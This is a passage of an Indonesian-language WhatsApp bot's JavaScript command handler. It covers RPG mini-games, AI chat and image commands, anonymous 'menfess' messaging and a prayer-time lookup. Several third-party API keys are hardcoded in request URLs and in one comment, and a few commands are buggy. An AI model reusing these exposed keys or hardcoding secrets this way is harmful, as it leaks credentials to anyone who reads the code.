} else if (tempsa === 'chade mountain') {
let seye = `https://telegra.ph/file/efdcd7d07dd22294695a8.jpg`
setTimeout( () => {
const pore = Math.ceil(Math.random() * 40)
const pone = Math.ceil(Math.random() * 60)
addOre(m.sender, pore)
addStone(m.sender, pone)
juna.sendMessage(m.chat, {image:{url:seye}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${pore}* copper ore dan ${pone} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 3000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'gerbil woods') {
let siae = `https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg`
setTimeout( async () => {
const tzys = Math.ceil(Math.random() * 90) // batu
const isue = Math.ceil(Math.random() * 45)
addStone(m.sender, tzys)
addKayu(m.sender, isue)
juna.sendMessage(m.chat, {image:{url:siae}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tzys}* batu dan *${isue}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'moobiens grassland') {
let bbbb = `https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg`
setTimeout( () => {
const awqu = Math.ceil(Math.random() * 200) // batu
const usui = Math.ceil(Math.random() * 20)
addStone(m.sender, awqu)
addKayu(m.sender, usui)
juna.sendMessage(m.chat, {image:{url:bbbb}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${awqu}* batu dan ${usui} kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`} ,{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else {
let seae = await getBuffer(`https://telegra.ph/file/16857796fab2ccb6cffc2.jpg`)
tesk = `*PILIH WILAYAH YANG INGIN KAMU JELAJAHI*


⚪ Corbiens River
🔵 Cochher Sea
⚫ Moobiens Grassland
🟣 Gerbil Woods
🟢 Chiltawa Woods
🟠 Limingstall Mountains
🔴 Chade Mountain

Example :
- ${prefix}jelajah corbiens river
`
juna.sendMessage(m.chat, { image: seae, caption: tesk}, {quoted: m}) 
}
}
break
case 'mancing':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
setTimeout( () => {
const fishing = Math.ceil(Math.random() * 10)
addIkan(m.sender, fishing)
newReply(`*Congratulation 🎊*\n\n kamu mendapatkan *${fishing}* Ikan selama 2 menit`)
}, 6000); //2 minute
setTimeout( () => {
newReply('Berhasil Mendapatkan Ikan . . .' )
}, 4000) // 1000 = 1s,
setTimeout( () => {
newReply('🎣 Menarik Kail. . .' )
}, 3000) // 1000 = 1s,
setTimeout( () => {
newReply('🎣 Mulai Memancing . . .')
}, 0) // 1000 = 1s,
}
break
case 'jualikan':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIkan = 10000
const hasil1 = bayar * hargaIkan
if ( getMancingIkan(m.sender) <= 1 ) return newReply(`Maaf ${pushname} ikan kamu belum cukup, minimal 2 ikan`)
if ( getMancingIkan(m.sender) >= 1 ) {
jualIkan(m.sender, bayar)
addKoinUser(m.sender, hasil1)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah ikan dijual:* ${bayar}${enter}*Uang didapat:* ${hasil1}${enter}${enter}*Sisa ikan:* ${getMancingIkan(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break

case 'jualcoal':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaCoal = 15000
const hasil2 = bayar * hargaCoal
if ( getMiningcoal(m.sender) <= 1 ) return newReply(`Maaf ${pushname} kamu tidak punya coal`)
if ( getMiningcoal(m.sender) >= 1 ) {
jualcoal(m.sender, bayar)
addKoinUser(m.sender, hasil2)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Coal dijual:* ${bayar}${enter}*Uang didapat:* ${hasil2}${enter}${enter}*Sisa coal:* ${getMiningcoal(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'lebur':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaOre = 2
const hasil3 = bayar * hargaOre
if ( getMiningore(m.sender) <= 1 ) return newReply(`Maaf ${pushname} ore kamu belum cukup, minimal 2 ore`)
if ( getMiningore(m.sender) >= 1 ) {
jualore(m.sender, bayar)
addIngot(m.sender, hasil3)
await newReply(`*「 LEBUR BERHASIL 」*\n\n*Jumlah Ore dilebur :* ${bayar}\n*Ingot didapat:* ${hasil3}\n\n*Sisa Ore:* ${getMiningore(m.sender)}`)
}
}
break
case 'jualstone':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaStone = 900
const hasil4 = bayar * hargaStone
if ( getMiningstone(m.sender) <= 1 ) return newReply(`Maaf ${pushname} stone kamu belum cukup, minimal 2 stone`)
if ( getMiningstone(m.sender) >= 1 ) {
jualstone(m.sender, bayar)
addKoinUser(m.sender, hasil4)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Batu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil4}${enter}${enter}*Sisa Batu:* ${getMiningstone(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualingot':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIngot = 35000
const hasil5 = bayar * hargaIngot
if ( getMiningingot(m.sender) <= 1 ) return newReply(`Maaf ${pushname} ingot kamu belum cukup, minimal 2 ingot`)
if ( getMiningingot(m.sender) >= 1 ) {
jualingot(m.sender, bayar)
addKoinUser(m.sender, hasil5)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Ingot dijual:* ${bayar}${enter}*Uang didapat:* ${hasil5}${enter}${enter}*Sisa Ingot:* ${getMiningingot(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualkayu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaKayu = 18000
const hasil6 = bayar * hargaKayu
if ( getNebangKayu(m.sender) <= 1 ) return newReply(`Maaf ${pushname} kayu kamu belum cukup, minimal 2 kayu`)
if ( getNebangKayu(m.sender) >= 1 ) {
jualkayu(m.sender, bayar)
addKoinUser(m.sender, hasil6)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Kayu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil6}${enter}${enter}*Sisa Kayu :* ${await getNebangKayu(m.sender)}${enter}*Sisa uang:* ${await checkATMuser(m.sender)}`)
}
}
break
case 'nebang':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
setTimeout( () => {
const oreo = Math.ceil(Math.random() * 20)
addKayu(m.sender, oreo)
newReply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${oreo}*kayu selama 2 menit`)
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang menebang, silahkan tunggu...')
}, 0) //1sec
}
break
case 'goplanet':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
setTimeout( () => {
const bertualang = Math.ceil(Math.random() * 100)
const goplanet =['merkurius','venus','mars','jupiter','saturnus','neptunus','uranus']
const planetari = goplanet[Math.floor(Math.random() * goplanet.length)]
addPlanet(m.sender, bertualang)
newReply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${bertualang} bahan kimia dari ${planetari}* selama 2 tahun`)
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang meroket 😱, silahkan tunggu... 2 tahun')
}, 0) //1sec
}
break
case 'jualbahankimia':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
buayar= args.join(" ")
const hargakimia = 1000
const dapetin = buayar * hargakimia
if ( getBertualangPlanet(m.sender) <= 1 ) return newReply(`maaf ${pushname} kamu tidak punya bahankimia`)
if ( getBertualangPlanet(m.sender) >= 1 ) {
jualbahankimia(m.sender, buayar)
addKoinUser(m.sender, dapetin)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah bahankimia dijual:* ${buayar}${enter}*Uang didapat:* ${dapetin}${enter}${enter}*Sisa bahankimia:* ${getBertualangPlanet(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}${enter}${enter}`)
}
}
break
case 'ai3':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Kirim perintah:\n${prefix+command} query\n\nContoh penggunaan:\n${prefix+command} apa itu openai`)
newReply(mess.wait)
try {
 const configuration = new Configuration({
apiKey: setting.OpenAIKey,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createChatCompletion({
model: "gpt-3.5-turbo",
messages: [{role: "user", content: text}],
});
newReply(`${response.data.choices[0].message.content}\n\n`);
} catch (err) {
//console.log(err);
newReply("Upss error silahkan gunakan fitur ai yang pertama dengan cara ketik .ai (Pertanyaan)\nContoh : .ai Sebutkan negara asean")
//newReply(JSON.stringify(err));
}
}
limitAdd(m.sender, limit)
break
case "aidraw": case "aidrawing": case "image": case "img": case 'chatgptimg': case 'openaiimg': case 'aiimg':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Kirim perintah:\n${prefix+command} query\n\nContoh penggunaan:\n${prefix+command} kabbah`)
newReply(mess.wait)
try {
const configuration = new Configuration({
apiKey: setting.OpenAIKey,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
juna.sendMessage(m.chat, {image:{url: response.data.data[0].url},caption: ""}, {quoted:m});
} catch (error) {
newReply(error.message);
}
limitAdd(m.sender, limit)
}
break
case 'aivoice': case 'aiv': {
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!q) return newReply(`Masukkan pertanyaan!\n\n*Contoh:* Siapa presiden Indonesia?`)
  let name = juna.getName(m.sender);
  await juna.sendPresenceUpdate('recording', m.chat);
let result = await fetchJson(`https://api.junn4.my.id/ai/chatGPT?text=${text}`)
  const text = result.result;
addCountCmd('#say', m.sender, _cmd)
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
newReply(e + '')
res = await tts(text)
} finally {
juna.sendMessage(m.chat, {audio: res, mimetype: 'audio/mpeg', ptt: true}, {quoted:m})
}
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'ai': case 'chatgpt':
try {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh:\n${prefix}${command} Apa itu chatgpt`)
let result = await fetchJson(`https://api.lolhuman.xyz/api/openai?apikey=6b882dde90583a8ea51d4fcf&text=gunakan bahas indonesia,${text}`)
const gpt = result.result
newReply(`${gpt}`)
} catch (err) {
console.log(err)
newReply('Terjadi Kesalahan')
}
limitAdd(m.sender, limit)
break
case 'ai2': case 'chatgpt2':
try {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh:\n${prefix}${command} Apa itu chatgpt`)
let result = await fetchJson(`https://skizo.tech/api/bard?text=${text}&apikey=${setting.XznKey}`)
const gpt = result.content
newReply(`${gpt}`)
} catch (err) {
console.log(err)
newReply('Terjadi Kesalahan')
}
limitAdd(m.sender, limit)
break
case "confess": case 'menfes': case 'menfess':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
this.menfes = this.menfes ? this.menfes : {}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return newReply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return newReply('Fitur Khusus Di private chat!')
if (!text) return newReply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return newReply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return newReply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return newReply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await juna.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
newReply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return newReply("Belum ada sesi menfess")
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.menfes[find.id] = {...find}
await juna.sendMessage(other, {text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, mentions: [m.sender]})
juna.sendMessage(m.chat, {text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`})
}
break
 case 'tolakmenfess': case 'tolakmenfes': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return newReply("Belum ada sesi menfess")
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
juna.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await juna.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
newReply("Menfess berhasil di tolak 🤚")
delete this.menfes[roof.id]
}
break
 case "stopconfess": case 'stopmenfess': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
 //find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return newReply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
juna.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await newReply("ok")
delete this.menfes[find.id]
}
 break
//cuddle
case 'cuddleapi':{
  let dino = `https://api.lolhuman.xyz/api/random/sfw/cuddle?apikey=adb5067c38221ea157b5a3cf`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
}
break
// cuddle with pkg
case 'cuddle':{
let anu = await fetchJson(`https://nekos.life/api/v2/img/cuddle`)
const url = anu.url
juna.sendStickerFromUrl(m.chat, url, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })

}
break

// slap with pkg

case 'slap':{

let anu = await fetchJson(`https://nekos.life/api/v2/img/slap`)

const url = anu.url

juna.sendStickerFromUrl(m.chat, url, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })

}
break

// kiss with pkg

case 'kiss':{

let anu = await fetchJson(`https://nekos.life/api/v2/img/kiss`)

const url = anu.url

juna.sendStickerFromUrl(m.chat, url, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })

}
// break

//     case 'jadwalshalat': {

//         if (!text) newReply(`Kirim perintah:\n${prefix+command} nama daerah\n\nContoh penggunaan:\n${prefix+command} Makassar`)

//                 let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/jadwalshalat?apikey=JzhSmQ4Y5AerDXy&daerah=${q}`)

//                 let key = '*Jadwal Shalat *\n\n'

//                 key += `• Daerah : ${q}\n\n`

//                 key += `• Date : ${moment(new Date()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss DD/MM/YYYY')}\n`

//                 key += `• Subuh : ${data.status}\n`

//                 key += `• Zuhur : ${data.result.today.Dzuhur}\n`

//                 key += `• Ashr : ${data.result.today.Ashr}\n`

//                 key += `• Magrib : ${data.result.today.Maghrib}\n`

//                 key += `• Isya : ${data.result.today.Isya}\n`

//                 newReply(key)

//             }

 
break
case 'getpp': {
  if (!isDian) return newReply('Khusus Owner bot asu');
  if (!text) return newReply('Tag orang untuk melihat profilnya');
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let pp_user = await juna.profilePictureUrl(users, 'image');
  await juna.sendMessage(m.chat, { 
  image: { url: pp_user }, 
  caption: `Profile ${users}`, 
  mentions: [users]
}, { quoted: m });

  // await juna.sendMessage(m.chat, { image: { url: pp_user }, caption: `Profile ${users}`}, { quoted: m});
  break;
}


break
case'jadwalsholat':{
  if (isBan) return newReply('Lu di ban kocak awokwok') 
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!q) return newReply(`Example: ${prefix+command} lokasi`)
  juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  try{
  let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/jadwalshalat?apikey=JzhSmQ4Y5AerDXy&daerah=${q}`)
  const shb = anu.result.today.Shubuh
  const dhz = anu.result.today.Dzuhur
  const ashr = anu.result.today.Ashr
  const mgrb = anu.result.today.Maghrib
  const isya = anu.result.today.Isya
  await juna.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/fb96176a5caa9d9a07bde.jpg'}, caption: `⏱️𝕁𝕒𝕕𝕨𝕒𝕝 𝕊𝕙𝕠𝕝𝕒𝕥⏱️\n \n📛𝐃𝐚𝐞𝐫𝐚𝐡📛 : ${q}\n \n⌛𝐖𝐚𝐤𝐭𝐮⌛ : ${moment(new Date()).tz('Asia/Jakarta').locale('id').format('DD/MM/YYYY')}\n \n📌𝐒𝐡𝐮𝐛𝐮𝐡 : ${shb}\n📌𝐃𝐳𝐮𝐡𝐮𝐫 : ${dhz}\n📌𝐀𝐬𝐡𝐚𝐫 : ${ashr}\n📌𝐌𝐚𝐠𝐡𝐫𝐢𝐛 : ${mgrb}\n📌𝐈𝐬𝐲𝐚 : ${isya}`}, {quoted: m})
  await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
  }catch (error) {
  newReply(`Error!\nJadwal sholat tidak ditemukan.\nMencoba untuk menggunakan server 2!`);
  try{
    //JzhSmQ4Y5AerDXy && Ya8mZzbY6hsNFR4 && ZFBsbrJfud5RA3g && MCkII8DRUo95Uo6
    let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/jadwalshalat?apikey=Ya8mZzbY6hsNFR4&daerah=${q}`)
    const shb = anu.result.today.Shubuh
    const dhz = anu.result.today.Dzuhur
    const ashr = anu.result.today.Ashr
    const mgrb = anu.result.today.Maghrib
    const isya = anu.result.today.Isya
    await juna.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/fb96176a5caa9d9a07bde.jpg'}, caption: `⏱️𝕁𝕒𝕕𝕨𝕒𝕝 𝕊𝕙𝕠𝕝𝕒𝕥⏱️\n \n📛𝐃𝐚𝐞𝐫𝐚𝐡📛 : ${q}\n \n⌛𝐖𝐚𝐤𝐭𝐮⌛ : ${moment(new Date()).tz('Asia/Jakarta').locale('id').format('DD/MM/YYYY')}\n \n📌𝐒𝐡𝐮𝐛𝐮𝐡 : ${shb}\n📌𝐃𝐳𝐮𝐡𝐮𝐫 : ${dhz}\n📌𝐀𝐬𝐡𝐚𝐫 : ${ashr}\n📌𝐌𝐚𝐠𝐡𝐫𝐢𝐛 : ${mgrb}\n📌𝐈𝐬𝐲𝐚 : ${isya}`}, {quoted: m})
    await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
    }catch (error) {
    newReply(`Error!\nJadwal sholat tidak ditemukan.\nMenghubungkan ke server 3!`);
    try{
    let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/jadwalshalat?apikey=ZFBsbrJfud5RA3g&daerah=${q}`)
    const shb = anu.result.today.Shubuh
    const dhz = anu.result.today.Dzuhur
    const ashr = anu.result.today.Ashr
    const mgrb = anu.result.today.Maghrib
    const isya = anu.result.today.Isya
    await juna.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/fb96176a5caa9d9a07bde.jpg'}, caption: `⏱️𝕁𝕒𝕕𝕨𝕒𝕝 𝕊𝕙𝕠𝕝𝕒𝕥⏱️\n \n📛𝐃𝐚𝐞𝐫𝐚𝐡📛 : ${q}\n \n⌛𝐖𝐚𝐤𝐭𝐮⌛ : ${moment(new Date()).tz('Asia/Jakarta').locale('id').format('DD/MM/YYYY')}\n \n📌𝐒𝐡𝐮𝐛𝐮𝐡 : ${shb}\n📌𝐃𝐳𝐮𝐡𝐮𝐫 : ${dhz}\n📌𝐀𝐬𝐡𝐚𝐫 : ${ashr}\n📌𝐌𝐚𝐠𝐡𝐫𝐢𝐛 : ${mgrb}\n📌𝐈𝐬𝐲𝐚 : ${isya}`}, {quoted: m})
    await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
    }catch (error) {
    newReply(`Error!\nJadwal sholat tidak ditemukan.\nMenghubungkan ke server 4!`);
     try{
      let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/jadwalshalat?apikey=MCkII8DRUo95Uo6&daerah=${q}`)
      const shb = anu.result.today.Shubuh
      const dhz = anu.result.today.Dzuhur
      const ashr = anu.result.today.Ashr
      const mgrb = anu.result.today.Maghrib
      const isya = anu.result.today.Isya
      await juna.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/fb96176a5caa9d9a07bde.jpg'}, caption: `⏱️𝕁𝕒𝕕𝕨𝕒𝕝 𝕊𝕙𝕠𝕝𝕒𝕥⏱️\n \n📛𝐃𝐚𝐞𝐫𝐚𝐡📛 : ${q}\n \n⌛𝐖𝐚𝐤𝐭𝐮⌛ : ${moment(new Date()).tz('Asia/Jakarta').locale('id').format('DD/MM/YYYY')}\n \n📌𝐒𝐡𝐮𝐛𝐮𝐡 : ${shb}\n📌𝐃𝐳𝐮𝐡𝐮𝐫 : ${dhz}\n📌𝐀𝐬𝐡𝐚𝐫 : ${ashr}\n📌𝐌𝐚𝐠𝐡𝐫𝐢𝐛 : ${mgrb}\n📌𝐈𝐬𝐲𝐚 : ${isya}`}, {quoted: m})
      await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
      }catch (error) {
      newReply(`Error!\nJadwal sholat tidak ditemukan.\nPastikan lokasinya bener wak🥰🥰🥰🥰🥰🥰!`);
    }
  }
}}}
  limitAdd(m.sender, limit)
  
  break
// anime search
// case'animesearch':{
//   if (isBan) return newReply('Lu di ban kocak awokwok') 
//   if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
//   if (!q) return newReply(`Example: ${prefix+command} judul anime`)
//   juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
//   try{
//   let anu = await fetchJson(`https://api.zonerweb.biz.id/api/webanime/anime?query=${q}&apikey=chiwa`)
//   // const foto = anu.result.attributes.coverImage.original
//   const shb = anu.result.id
//   await juna.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/fb96176a5caa9d9a07bde.jpg' }, caption: `sinopsis ${shb}`}, {quoted: m})
//   await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
//   }catch (error) {
//   console.log(error)
//   newReply(error)
//   }
// }
// break
case'animesearch':{
  if (isBan) return newReply('Lu di ban kocak awokwok') 
  if (!isPremium) return newReply('Khusus Premium')
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!text) return newReply(`Example: ${prefix+command} judul anime`)
  juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  try{
  let anu = await fetchJson(`https://api.zonerweb.biz.id/api/webanime/anime?query=${text}&apikey=chiwa`)
  // const foto = anu.result.attributes.coverImage.original
  const sinopsis = anu.result[0].attributes.synopsis
  const fotonya = anu.result[0].attributes.posterImage.original;
  const jepangnya = anu.result[0].attributes.titles.ja_jp
  const ratingnya = anu.result[0].attributes.averageRating;
  await newReply('Sedang menerjemahkan sinopsis,dimohon menunggu')
  let translatenya = await fetchJson(`https://api.lolhuman.xyz/api/openai?apikey=6b882dde90583a8ea51d4fcf&text=terjemahkan kedalam indonesia,${sinopsis}`)
  const trsinopsis = translatenya.result
  await juna.sendMessage(m.chat, { image: { url: fotonya }, caption: `*Judul:* ${jepangnya}\n\n*Sinopsis:* ${sinopsis}\n\n--------------------\n\n${trsinopsis}\n*Diterjemahkan oleh ChatGPT*\n\n*Rating:* ${ratingnya}⭐`}, {quoted: m})
  await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
  }catch (error) {
  console.log(error)
  newReply(error)
  }
}
break
case'downloadfilm':{
  if (isBan) return newReply('Lu di ban kocak awokwok') 
  if (!isPremium) return newReply('Khusus Premium')
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!text) return newReply(`Example: ${prefix+command} judul anime`)
